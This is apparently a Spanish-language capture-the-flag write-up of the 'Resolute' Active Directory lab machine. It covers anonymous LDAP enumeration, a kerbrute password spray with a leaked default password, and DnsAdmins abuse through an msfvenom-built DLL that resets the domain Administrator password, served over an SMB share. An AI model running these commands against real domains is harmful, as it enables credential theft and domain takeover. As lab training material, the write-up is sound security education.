---
title: Resolute
published: true
categories: [Active Directory,Medium]
tags: [Active directory explotation]

image:
  path: https://user-images.githubusercontent.com/55555187/161285534-22daab85-6297-4e35-a744-9e0ae641b0dc.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
 
---

# Resolute

Resolute es una <font color="#FFC300">máquina Medium</font> de temática <font color="#8E44AD">Active Directory</font> en la que se toca explotación de consultas anónimas en ldap, enumeración del servicio samba, password spray en Kerberos y abuso del grupo dnsAdministrators.

## Reconocimiento

Una vez que veo que la máquina es accesible, realizo un escaneo de puertos con nmap.

```
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.169
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/161283711-912f31f3-ea43-49dc-82e7-f452d528e543.png" title="" alt="recon1" width="290">

Posteriormente, realizo un escaneo con nmap para identificar el servicio y versión de estos.

```
nmap -sC -sV -p88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49680,49712,49740 10.10.10.169
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/161283712-aa46aff3-3491-4703-883d-d86a4554d7f7.png" title="" alt="recon2" width="585">

Lo primero que hago es ver si tengo acceso a alguna carpeta compartida mediante samba.

```
smbmap 10.10.10.169
```

Pero no hay nada.

Veo que ldap está abierto, pruebo a ver si puedo lanzar consultas anónimas.

```
ldapsearch -x -h 10.10.10.169 -s base namingcontexts
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/161283704-9f40639a-e372-4aad-8eee-9c828b821469.png" title="" alt="ldap1" width="588">

Pruebo a lanzar una consulta para obtener el ldap entero.

```
ldapsearch -x -h 10.10.10.169 -b "DC=megabank,DC=local"
```

Obteniendo el ldap y guardandolo en mi máquina.

## Obtención de acceso

Pruebo a enumerar usuarios válidos del sistema.

```
ldapsearch -x -h 10.10.10.169 -b "DC=megabank,DC=local" "(objectClass=person)" | grep "userPrincipalName:""
```

Obteniendo una lista de usuarios válidos.

Además de esto, búsco en el ldap posibles contraseñas filtrando por "userPassword", "pwd", "Pwd", "Password", "password" obteniendo en una de las consultas lo siguiente:

<img src="https://user-images.githubusercontent.com/55555187/161283707-74cc8f78-c57c-42d9-8579-ca03ab48073a.png" title="" alt="ldap2" width="612">

Con la lista de usuario y la contraseña **Welcome123!**, lanzo un **password spray attack** con **kerbrute**.

```
kerbrute.py passwordspray users.txt Welcome123! -d megabank.local --dc 10.10.10.169
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/161283682-2cf38e77-2b21-401d-ad37-f7e15154c1e8.png" title="" alt="recon5" width="608">

Valido las credenciales con crackmapexec y compruebo si melanie pertenece al grupo remote management users.

<img src="https://user-images.githubusercontent.com/55555187/161283716-7312465a-e831-479a-bed8-a9639766646f.png" title="" alt="recon3" width="618">

Me conecto usando evil-winrm y empiezo a enumerar la máquina. Me llama la atención el directorio del usuario ryan al que quizás más adelante tengamos que pivotar.

<img src="https://user-images.githubusercontent.com/55555187/161283721-8cf68942-6a04-4192-b84a-f21cb6b42834.png" title="" alt="recon4" width="564">

## Escalada de privilegios

Lanzo **winPEAS** para enumerar el sistema de forma rápida pero no encuentra nada interesante.

Lanzo **bloodhound** haciendo uso de **neo4j** y **bloodhound-python** pero tampoco me reporta nada interesante más allá del usuario ryan como se ha comentado anteriormente.

Viendo que con melanie no puedo hacer gran cosa, busco vías para pivotar hacia ryan o quizás directamente hacia Administrator. Listando directorios ocultos con -force descubro el directorio **PSTranscripts** en C:\\\

<img src="https://user-images.githubusercontent.com/55555187/161283700-bae688c3-be3c-44e1-94b4-d3be6a8d0078.png" title="" alt="force1" width="513">

Trás indagar más usando -force descubro el archivo **PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt**.

<img src="https://user-images.githubusercontent.com/55555187/161283702-d4de96f3-288c-4a86-b9ad-d55104c2fdea.png" title="" alt="force2" width="596">

Al abrirlo puedo ver que se trata de una especie de log en el que se pueden observar las credenciales de ryan.

<img src="https://user-images.githubusercontent.com/55555187/161283703-4881a4d7-77e3-48e4-a8ff-860c57618261.png" title="" alt="force3" width="603">

Valido las credenciales con crackmapexec y miro si me puedo conectar mediante winRM.

![recon17](https://user-images.githubusercontent.com/55555187/161283689-b50572b2-e2b5-48de-8e78-6e1aead67846.png)

Mirando los detalles de ryan con bloodhound descubro que es miembro del grupo dnsAdministrator.

<img src="https://user-images.githubusercontent.com/55555187/161283693-0a8ba88e-758a-48bf-b59a-17618f7e096c.png" title="" alt="recon18" width="620">

Investigando un poco descubro que es posible cargar un **dll malicioso** que se ejecute al iniciar el servicio dns con permisos de Administrador.

Creo un dll malicioso con **msfvenom** el cual cambiará la contraseña del usuario Administrator utilizando el binario **net**.

```
sudo msfvenom -a x64 -p windows/x64/exec "cmd net user administrator kripteria123 /domain" -f dll > abuse.dll
```

Comparto el archivo mediante samba con **smbserver.py** 

```
smbserver.py share ./
```

Cargo el dll, paro el servicio dns, lo vuelvo a iniciar y en el servidor samba vemos un hash NTLMv2 indicativo de que ha funcionado.

![recon16](https://user-images.githubusercontent.com/55555187/161283687-226bb4dd-4b3e-4fc9-83c5-be00f59f893a.png)

![recon19](https://user-images.githubusercontent.com/55555187/161283695-48e0e3e8-f95a-4014-a554-fb788c232cf4.png)

Usando psexec me conecto usando las nuevas credenciales de Administrator.

<img src="https://user-images.githubusercontent.com/55555187/161283698-be278476-1b03-4a82-b178-ad01199261af.png" title="" alt="recon20" width="624">
